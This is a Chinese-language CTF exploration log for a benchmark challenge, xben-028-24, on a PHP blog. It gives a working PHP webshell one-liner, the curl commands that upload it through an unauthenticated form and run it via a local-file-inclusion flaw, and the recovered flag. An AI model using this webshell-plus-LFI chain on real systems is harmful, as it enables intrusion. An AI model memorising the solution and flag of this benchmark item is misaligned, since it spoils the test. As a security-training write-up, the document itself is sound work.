# xben-028-24 · 探索记录

对应题解：[`xben-028-24.md`](./xben-028-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，
标题 `Encoder64 Blog`。

首页线索：

```html
<p class="lead mb-0">e0knbV9hX1NjcmlwdF9LaWRkaWV9</p>
```

base64 解码：`{I'm_a_Script_Kiddie}`。

链接：

```text
/index.php  /about.php  /contact.php  /post.php?id=<slug>
/posts/upload-article.php            ← 投稿上传
```

## 第一阶段：post.php 的 id 是什么

| id | 结果 |
| --- | --- |
| `ScriptKiddie` | 正常渲染文章 |
| `1` | `Post not found.` |
| `ScriptKiddie'` | `Post not found.` |
| `../index.php` | `Directory traversal attempt detected!` |
| `../../../../etc/passwd` | 同上（被拦） |
| `....//....//etc/passwd` | 被拦 |
| `..%2f..%2fetc/passwd` | 被拦 |
| `%2e%2e/%2e%2e/etc/passwd` | `Post not found.`（没穿透） |
| `/etc/passwd` | `Post not found.` |

结论：`id` 是**文章 slug / 文件名**，服务端会 include `posts/<id>.php`；
过滤只针对字面量 `../`。

顺手试了 base64 提示：

| id | 结果 |
| --- | --- |
| `e0knbV9hX1NjcmlwdF9LaWRkaWV9` | `Post not found.` |
| `{I'm_a_Script_Kiddie}` | `Post not found.` |

说明那串 base64 只是主题彩蛋，不是路径。

## 第二阶段：上传点

`/posts/upload-article.php` 是一个 multipart 表单（`name`、`email`、`articleFile`），
没有任何登录要求。

上传一个 PHP 文件：

```bash
printf '<?php echo "PWN:"; echo shell_exec($_GET["c"]); ?>' > sh28.php
curl -F 'name=x' -F 'email=a@b.c' \
  -F 'articleFile=@sh28.php;filename=sh28.php;type=application/x-php' \
  /posts/upload-article.php
# 200，正文只说 "Thank you for submitting your article, we will review it shortly."
```

**没有返回路径**，于是按常见落点逐个探：

| 路径 | 结果 |
| --- | --- |
| `/uploads/sh28.php` | 404 |
| **`/posts/uploads/sh28.php`** | **200，返回源码** |
| `/posts/sh28.php` | 404 |
| `/articles/sh28.php` | 404 |
| `/static/uploads/sh28.php` | 404 |

访问到的是**源码**（`<?php echo "PWN:"; …`），说明该目录不解析 PHP。

## 第三阶段：用 LFI 把上传文件 include 进来

既然 `post.php?id=` 会拼 `posts/<id>`，那就把 `id` 指向上传目录：

```bash
curl --get --data-urlencode 'id=uploads/sh28' --data-urlencode 'c=id' /post.php
```

```text
PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**不需要任何 `../`**：`posts/` 与 `posts/uploads/` 是父子关系，
`id=uploads/sh28` 就在基准目录内部，天然绕过过滤。

## 第四阶段：读 flag

```bash
curl --get --data-urlencode 'id=uploads/sh28' --data-urlencode 'c=ls /' /post.php
```

根目录里有 `FLAG.txt`（大写）。注意 `/flag` 与 `/challenge/flag.txt` 在这题都不存在。

```bash
curl --get --data-urlencode 'id=uploads/sh28' --data-urlencode 'c=cat /FLAG.txt' /post.php
# PWN:flag{cc60f9f8-07d5-4763-9e30-685e4e55c14a}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `post.php?id=` 路径穿越（`../`、`....//`、`..%2f`） | 全部 `Directory traversal attempt detected!` | 只拦字面量 `../` |
| `%2e%2e/` 编码穿越 | `Post not found.` | 查询参数里的 `%2e` 未被二次解码 |
| 绝对路径 `/etc/passwd` | `Post not found.` | 被拼成 `posts//etc/passwd` 之类，找不到 |
| 上传后直接请求 `/posts/uploads/sh28.php` | 返回源码 | 该目录不解析 PHP |
| 猜上传落点 `/uploads/`、`/posts/`、`/articles/`、`/static/uploads/` | 全 404 | 真实落点是 `/posts/uploads/` |
| 把 base64 提示当文件名/路径 | `Post not found.` | 只是文章主题彩蛋 |

## 这次真正的收获

1. **"上传成功但不解析"要立刻想到 LFI 包含。** 判断顺序：先确认文件落点
   （GET 到源码即成功），再找应用里**有没有 include 用户可影响路径的地方**。
   本题 `post.php?id=` 就是。
2. **不需要绕过滤就先算路径。** 上传目录 `posts/uploads/` 与 `post.php` 的
   基准目录 `posts/` 是父子关系，`id=uploads/xxx` 天然合法。
   很多人会直接上 `....//` 硬绕，其实没必要。
3. **上传表单不给路径时，用"源码回显"当成功判据。** 响应说"谢谢投稿"，
   但 `GET /posts/uploads/<filename>` 返回的就是我写的 PHP 源码，说明落点正确；
   如果返回 404 就要继续猜目录。
4. **首页的 base64 先解码再判断价值。** `{I'm_a_Script_Kiddie}` 是文章主题，
   与利用链无关；试了两种用法都是 `Post not found` 就应当放弃，
   而不是把它当"必须解开的关键"。
5. **`ls /` 应该成为拿 shell 后的第一条命令。** 这题 flag 是 `/FLAG.txt`（大写），
   和前几题的 `/flag`、`/challenge/flag.txt` 都不同。
